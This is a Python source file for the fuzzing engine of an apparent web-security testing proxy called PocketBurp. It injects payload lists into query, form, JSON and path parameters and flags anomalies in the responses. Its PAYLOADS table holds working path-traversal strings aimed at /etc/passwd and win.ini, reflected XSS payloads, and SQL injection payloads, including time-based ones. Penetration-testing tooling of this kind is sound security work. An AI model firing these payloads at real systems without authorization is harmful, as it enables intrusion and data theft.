#!/usr/bin/env python3
"""
PocketBurp -- scanner.py
Auto-fuzz engine used by the Scanner tab.

Injects payload families into every parameter of a chosen request
(URL query, form body, JSON fields, path segment) and records status,
length, timing, reflection and anomaly flags for each attempt. Runs in a
background thread; the GUI polls /api/scanner/results.

Authorized testing only.
"""

import html
import json
import re
import threading
import time
import urllib.parse
import uuid

import history
import proxy

MAX_REQUESTS = 400        # hard safety cap per scan
INTER_REQUEST_DELAY = 0.05

PAYLOADS = {
    "traversal": [
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fpasswd",
        "....//....//....//....//etc/passwd",
        "..\\..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "/etc/passwd",
        "%2Fetc%2Fpasswd",
        "....\\/....\\/....\\/etc/passwd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "C:\\Windows\\win.ini",
        "package.json",
        "../../../../package.json",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "\"><svg onload=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.domain)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "\"><iframe srcdoc='<script>alert(1)</script>'>",
        "<details open ontoggle=alert(1)>",
        "{{7*7}}",
        "${7*7}",
        "';alert(1);//",
    ],
    "sqli": [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR 1=1-- -",
        "\" OR \"1\"=\"1",
        "') OR ('1'='1",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "1' AND SLEEP(5)-- -",
        "1 AND SLEEP(5)",
        "'; WAITFOR DELAY '0:0:5'-- -",
        "admin'-- -",
        "' ORDER BY 100-- -",
    ],
}

ATTACK_LABELS = {
    "traversal": "Path Traversal / LFI",
    "xss": "Reflected XSS",
    "sqli": "SQL Injection",
    "custom": "Custom Wordlist",
}

_lock = threading.RLock()
_scans = {}     # scan_id -> {status, total, done, results[], error, started, finished}


# ------------------------------------------------------------------ helpers
def payloads_for(attack, custom_text=""):
    if attack == "custom":
        return [p for p in (l.strip() for l in (custom_text or "").splitlines()) if p]
    return list(PAYLOADS.get(attack, []))


def _split_query(path):
    if "?" not in path:
        return path, []
    base, qs = path.split("?", 1)
    pairs = []
    for part in qs.split("&"):
        if not part:
            continue
        k, _, v = part.partition("=")
        pairs.append([k, v])
    return base, pairs


def _join_query(base, pairs):
    if not pairs:
        return base
    return base + "?" + "&".join(
        "%s=%s" % (k, v) for k, v in pairs)


def _injection_points(req, enabled):
    """Return list of point descriptors:
    {kind: query|form|json|path, index, name, encode: bool}"""
    points = []
    _, pairs = _split_query(req.target)
    if "query" in enabled:
        for i, (k, v) in enumerate(pairs):
            points.append({"kind": "query", "index": i, "name": k, "encode": True})

    if "body" in enabled and req.body:
        ctype = (proxy.header_get(req.headers, "Content-Type", "") or "").lower()
        text = req.body.decode("utf-8", "replace")
        if "json" in ctype or text.strip().startswith(("{", "[")):
            try:
                data = json.loads(text)
            except ValueError:
                data = None
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, (str, int, float)):
                        points.append({"kind": "json", "index": k, "name": k,
                                       "encode": False})
        else:
            for i, part in enumerate(text.split("&")):
                if part:
                    k = part.split("=", 1)[0]
                    points.append({"kind": "form", "index": i, "name": k,
                                   "encode": True})

    if "path" in enabled:
        path_only = req.target.split("?", 1)[0]
        segs = [s for s in path_only.split("/") if s]
        if segs:
            points.append({"kind": "path", "index": len(segs) - 1,
                           "name": segs[-1], "encode": False})
    return points


def _apply(req, point, payload):
    """Return a copy of the raw request text with `payload` injected."""
    target = req.target
    body = req.body
    headers = list(req.headers)

    if point["kind"] in ("query", "form", "json", "path"):
        if point["kind"] == "query":
            base, pairs = _split_query(target)
            pairs[point["index"]][1] = (urllib.parse.quote(payload) if point["encode"]
                                        else payload.replace(" ", "%20"))
            target = _join_query(base, pairs)
        elif point["kind"] == "form":
            parts = body.decode("utf-8", "replace").split("&")
            k = parts[point["index"]].split("=", 1)[0]
            parts[point["index"]] = "%s=%s" % (k, urllib.parse.quote(payload))
            body = "&".join(parts).encode("utf-8")
            headers = proxy.header_set(headers, "Content-Length", str(len(body)))
        elif point["kind"] == "json":
            data = json.loads(body.decode("utf-8", "replace"))
            old = data.get(point["index"])
            if isinstance(old, (int, float)) and not isinstance(old, bool):
                try:
                    data[point["index"]] = float(payload)
                except ValueError:
                    data[point["index"]] = payload
            else:
                data[point["index"]] = payload
            body = json.dumps(data).encode("utf-8")
            headers = proxy.header_set(headers, "Content-Length", str(len(body)))
        elif point["kind"] == "path":
            path_only, _, qs = target.partition("?")
            segs = [s for s in path_only.split("/") if s]
            segs[point["index"]] = urllib.parse.quote(payload, safe="../\\%")
            target = "/" + "/".join(segs) + (("?" + qs) if qs else "")

    return ("%s %s %s\r\n" % (req.method, target, req.version)
            + "\r\n".join(headers) + "\r\n\r\n"
            + body.decode("utf-8", "replace"))


def _normalise(text):
    return re.sub(r"[^a-z0-9]", "", text.lower())


def _looks_reflected(payload, response_text):
    """A payload counts as reflected when it appears verbatim, URL-encoded,
    HTML-escaped, or as a normalised signature after decoding the response.
    Heuristic, deliberately biased toward flagging -- the researcher reviews."""
    if not payload or not response_text:
        return False
    probe = payload
    variants = [
        probe,
        urllib.parse.unquote(probe),
        urllib.parse.quote(probe, safe=""),
        urllib.parse.quote(probe),
        probe.replace("<", "&lt;").replace(">", "&gt;"),
        probe.replace('"', "&quot;").replace("'", "&#39;"),
    ]
    haystack = response_text.lower()
    for variant in variants:
        if variant and variant.lower() in haystack:
            return True

    # decode percent-encoding + entities, then compare alphanumeric signatures
    try:
        decoded = html.unescape(urllib.parse.unquote(response_text))
    except Exception:
        decoded = response_text
    sig = _normalise(probe)
    if len(sig) >= 8 and sig in _normalise(decoded):
        return True

    core = probe.strip("<>/\"'").strip()
    return len(core) >= 4 and core.lower() in haystack


# ---------------------------------------------------------------- scanning
def start(raw_request, attack, custom_wordlist="", points=None,
          host=None, port=None, scheme=None, label=""):
    """Kick off a scan in a background thread. Returns scan_id."""
    if isinstance(points, str):
        points = [points]
    enabled = set(points or ["query", "body", "json", "path"])
    attack = (attack or "traversal").lower()
    payloads = payloads_for(attack, custom_wordlist)
    scan_id = uuid.uuid4().hex[:10]

    req = proxy.parse_raw_request(raw_request)
    if not payloads:
        raise ValueError("No payloads to send (empty wordlist?)")

    state = {
        "id": scan_id,
        "status": "running",
        "attack": attack,
        "attack_label": ATTACK_LABELS.get(attack, attack),
        "label": label,
        "total": 0,
        "done": 0,
        "error": "",
        "started": time.time(),
        "finished": 0,
        "target": req.target,
        "host": host or "",
        "results": [],
        "baseline": {},
    }
    with _lock:
        _scans[scan_id] = state

    thread = threading.Thread(target=_run, name="scan-%s" % scan_id,
                              args=(state, req, payloads, enabled, host, port, scheme),
                              daemon=True)
    thread.start()
    return scan_id


def get(scan_id):
    with _lock:
        state = _scans.get(scan_id)
        if not state:
            return None
        return {
            "id": state["id"], "status": state["status"],
            "attack": state["attack"], "attack_label": state["attack_label"],
            "total": state["total"], "done": state["done"],
            "error": state["error"], "started": state["started"],
            "finished": state["finished"], "target": state["target"],
            "host": state["host"], "baseline": state["baseline"],
            "results": list(state["results"]),
        }


def latest():
    with _lock:
        if not _scans:
            return None
        return max(_scans.values(), key=lambda s: s["started"])["id"]


def seed_demo():
    """Insert a finished sample scan so the GUI has something to render
    in --demo mode. No network traffic is generated."""
    scan_id = "demo%06d" % int(time.time() % 1000000)
    rows = [
        {"payload": "../../../../etc/passwd", "point": "query:path",
         "method": "GET", "url": "http://192.168.1.42:3000/files?path=../../../../etc/passwd",
         "status": 200, "length": 1821, "time_ms": 44, "reflected": 0,
         "flags": ["length"], "error": ""},
        {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "point": "query:path",
         "method": "GET", "url": "http://192.168.1.42:3000/files?path=..%2f..%2f..%2f..%2fetc%2fpasswd",
         "status": 200, "length": 1821, "time_ms": 49, "reflected": 0,
         "flags": ["length"], "error": ""},
        {"payload": "....//....//....//etc/passwd", "point": "query:path",
         "method": "GET", "url": "http://192.168.1.42:3000/files?path=....//....//....//etc/passwd",
         "status": 500, "length": 421, "time_ms": 61, "reflected": 0,
         "flags": ["5xx"], "error": ""},
        {"payload": "/etc/passwd", "point": "query:path",
         "method": "GET", "url": "http://192.168.1.42:3000/files?path=/etc/passwd",
         "status": 404, "length": 194, "time_ms": 12, "reflected": 0,
         "flags": ["status-change"], "error": ""},
        {"payload": "../../../../package.json", "point": "query:path",
         "method": "GET", "url": "http://192.168.1.42:3000/files?path=../../../../package.json",
         "status": 200, "length": 967, "time_ms": 38, "reflected": 0,
         "flags": ["length"], "error": ""},
    ]
    with _lock:
        _scans[scan_id] = {
            "id": scan_id, "status": "done", "attack": "traversal",
            "attack_label": ATTACK_LABELS["traversal"], "label": "demo",
            "total": len(rows), "done": len(rows), "error": "",
            "started": time.time() - 60, "finished": time.time() - 58,
            "target": "/files?path=docs/readme.txt", "host": "192.168.1.42",
            "baseline": {"status": 200, "length": 74, "time_ms": 41, "error": ""},
            "results": rows,
        }
    return scan_id


def _run(state, req, payloads, enabled, host, port, scheme):
    try:
        points = _injection_points(req, enabled)
        if not points:
            state["status"] = "error"
            state["error"] = ("No injectable parameters found. Enable another "
                              "injection point or pick a request with a query string.")
            state["finished"] = time.time()
            return

        base_raw = ("%s %s %s\r\n" % (req.method, req.target, req.version)
                    + "\r\n".join(req.headers) + "\r\n\r\n"
                    + req.body.decode("utf-8", "replace"))
        base = proxy.send_raw_request(base_raw, default_host=host,
                                      default_port=port, default_scheme=scheme)
        base_status = base.get("status") or 0
        base_len = len(base.get("body") or b"")
        base_time = base.get("time_ms") or 0
        state["baseline"] = {"status": base_status, "length": base_len,
                             "time_ms": base_time,
                             "error": base.get("error", "")}

        total = min(len(payloads) * len(points), MAX_REQUESTS)
        state["total"] = total

        count = 0
        for point in points:
            for payload in payloads:
                if count >= total:
                    break
                mutated = _apply(req, point, payload)
                result = proxy.send_raw_request(
                    mutated, default_host=host, default_port=port,
                    default_scheme=scheme)
                status = result.get("status") or 0
                body_text = history.display_body(
                    result.get("headers", ""), result.get("body") or b"")
                length = len(result.get("body") or b"")
                time_ms = result.get("time_ms") or 0
                reflected = _looks_reflected(payload, body_text)

                flags = []
                if status >= 500:
                    flags.append("5xx")
                if base_status and status and abs(status - base_status) >= 100:
                    flags.append("status-change")
                if base_len and abs(length - base_len) > max(24, int(base_len * 0.25)):
                    flags.append("length")
                if reflected:
                    flags.append("reflected")
                if time_ms > max(4000, base_time + 3500):
                    flags.append("time")
                if not result.get("ok"):
                    flags.append("error")

                row = {
                    "payload": payload,
                    "point": "%s:%s" % (point["kind"], point["name"]),
                    "method": result.get("method") or req.method,
                    "url": "%s://%s%s" % (result.get("scheme") or scheme or "http",
                                          result.get("host") or host or "",
                                          result.get("path") or req.target),
                    "status": status,
                    "length": length,
                    "time_ms": time_ms,
                    "reflected": 1 if reflected else 0,
                    "flags": flags,
                    "error": result.get("error") or "",
                }
                with _lock:
                    state["results"].append(row)
                    state["done"] = count + 1
                history.log_scan_row(state["id"], state["attack"], payload,
                                     row["point"], row["method"], row["url"],
                                     status, length, time_ms, reflected, flags)
                count += 1
                time.sleep(INTER_REQUEST_DELAY)

        with _lock:
            state["status"] = "done"
            state["finished"] = time.time()
    except Exception as exc:
        with _lock:
            state["status"] = "error"
            state["error"] = "%s: %s" % (type(exc).__name__, exc)
            state["finished"] = time.time()
